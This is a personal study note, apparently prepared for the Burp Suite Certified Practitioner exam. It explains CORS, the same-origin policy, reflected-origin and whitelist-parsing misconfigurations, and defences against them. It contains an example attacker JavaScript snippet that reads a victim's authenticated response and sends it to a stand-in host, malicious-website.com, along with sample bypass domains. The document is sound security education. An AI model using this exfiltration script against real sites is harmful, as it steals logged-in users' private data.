---
title: What IS CORS
author: Jon Marien
created: 2026-01-14
published: 2026-01-14
tags:
  - certs
  - bscp
  - burp
---

| Title        | Author     | Created          | Published        | Tags                                                   |
| ------------ | ---------- | ---------------- | ---------------- | ------------------------------------------------------ |
| What IS CORS | Jon Marien | January 14, 2026 | January 14, 2026 | [[#certs\|#certs]], [[#bscp\|#bscp]], [[#burp\|#burp]] |

# Description
CORS is a browser feature that lets a site on one origin (scheme + host + port) ask the browser for permission to read responses from a different origin, under rules defined by the target server’s CORS policy.
![[image-1060.png]]

# CORS – What It Is
Cross-origin resource sharing (CORS) extends the Same-Origin Policy by allowing a server to say “these other origins are allowed to read my responses,” using headers like `Access-Control-Allow-Origin`. It’s meant to enable controlled cross-domain access for web apps (for example, SPA front end on one domain calling an API on another), not to stop cross-origin requests themselves.

## Core Idea
- Browser sends a cross-origin request and applies SOP: by default, JS cannot read the response.  
- If the response includes the right CORS headers (for example, `Access-Control-Allow-Origin: https://example.com`), the browser relaxes SOP and lets that origin’s JS access the response.  
- If CORS is misconfigured (for example, using `*` or reflecting attacker-controlled origins), a malicious origin may gain access to sensitive responses.

### Why It’s Bad / Impact When Misconfigured
- A poorly configured CORS policy can let an attacker’s site read authenticated responses from a victim’s browser, exfiltrating data like profile info or API responses.  
- CORS **does not** protect against CSRF; cross-site requests still happen, CORS only governs whether JS on the attacking origin can read the response.

### Protect Against It
- Be strict with allowed origins: use explicit allowlists, not `*` nor dynamic reflection of arbitrary `Origin` headers.  
- Only enable CORS on endpoints that truly need cross-origin access, and never include sensitive endpoints by default.  
- Remember CORS is a **relaxation** mechanism, not a security control—combine it with proper authentication, authorization, and CSRF defenses.

---
# Same Origin Policy
The same-origin policy (SOP) is a browser security rule that restricts how pages from different origins can interact so one site cannot freely read another site’s data in the user’s browser.

It defines `origin` as `scheme + host + port`, and generally allows a page to *send* requests cross-origin (for example, via forms, images, or scripts) but blocks JavaScript from *reading* most cross-origin responses. This helps prevent a malicious site from silently reading private data loaded from another site where the user is logged in.

---
# Relaxation of the Same-Origin Policy
Relaxation of the same-origin policy is basically "safe exceptions" to SOP so some cross-origin reads are allowed, but only under rules the target site defines.

Many apps need their frontend on one origin to talk to an API on another, or to subdomains, so the browser uses CORS to relax SOP in a controlled way. With CORS, the server sends HTTP headers (like `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`) telling the browser which origins are trusted and whether credentials can be included. The browser and cross-origin site do a header "handshake", and only if the rules match does the browser allow JS to read the cross-origin response.

---
# Vulns Arising from CORS Config Issues
Many modern websites use CORS to allow access from subdomains and trusted third parties. Their implementation of CORS may contain mistakes or be overly lenient to ensure that everything works, and this can result in exploitable vulnerabilities.

---
# Lab

![[image-1062.png]]
![[image-1061.png]]
![[image-1063.png]]

Bit sloppy on the report here but this one was fun.

---
# Server-Generated ACAO Header from Client-Specified Origin Header
## CORS Misconfig – Reflected Origin (ACAO)
This misconfiguration happens when a server reads the client-supplied `Origin` header and blindly reflects it back in `Access-Control-Allow-Origin`, effectively trusting any requesting site.  If the server also returns `Access-Control-Allow-Credentials: true`, then cross-origin requests can include the victim’s cookies and run “in-session,” which can expose sensitive response data to an attacker-controlled origin.

## Core Idea
- The attacker makes the victim’s browser send a request to the target site with `Origin: https://malicious-website.com` and the victim’s cookies attached (because the victim is logged in).
- The vulnerable server responds with:  
  - `Access-Control-Allow-Origin: https://malicious-website.com`  
  - `Access-Control-Allow-Credentials: true`  
  which tells the browser it’s OK for JS running on `malicious-website.com` to read the response.
- The attacker’s page can then read the sensitive response body and exfiltrate it (i.e.: sending it to an attacker endpoint).

Example request:

```http
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

Example response:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

Example attacker script:

```js
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='//malicious-website.com/log?key='+this.responseText;
};
```

## Why It’s Bad / Impact
Because the server "approves" any origin the attacker chooses, **any domain** can potentially read sensitive responses from the vulnerable site, including secrets like API keys or CSRF tokens if they appear in the response.  This turns CORS into a data-exfiltration channel: the browser fetches the data with the user’s session, then attacker JavaScript reads it and forwards it out.

## Protect Against It

- Do not reflect arbitrary `Origin` values into `Access-Control-Allow-Origin`...use a strict `allowlist` of trusted origins and match exactly.  
- Avoid enabling credentialed cross-origin reads unless absolutely required, and keep sensitive endpoints off CORS entirely where possible.  
- Treat "internal secrets in responses" as a design flaw: don’t expose tokens/keys in endpoints that could ever be reachable cross-origin.

---
# Errors parsing Origin headers
Some applications that support access from multiple origins do so by using a whitelist of allowed origins. When a CORS request is received, the supplied origin is compared to the whitelist. If the origin appears on the whitelist then it is reflected in the Access-Control-Allow-Origin header so that access is granted. For example, the application receives a normal request like:

```http
GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com
```

The application checks the supplied origin against its list of allowed origins and, if it is on the list, reflects the origin as follows:

```http
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com
```

Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence). And some applications allow access from various other organizations' domains including their subdomains. These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. Any mistakes in the implementation can lead to access being granted to unintended external domains.

For example, suppose an application grants access to all domains ending in:
```http
normal-website.com
```

An attacker might be able to gain access by registering the domain:

```http
hackersnormal-website.com
```

Alternatively, suppose an application grants access to all domains beginning with:
```http
normal-website.com
```

An attacker might be able to gain access using the domain:
```http
normal-website.com.evil-user.net
```

---
# Whitelisted null origin value
The specification for the Origin header supports the value null. Browsers might send the value null in the Origin header in various unusual situations:

- Cross-origin redirects.
- Requests from serialized data.
- Request using the file: protocol.
- Sandboxed cross-origin requests.

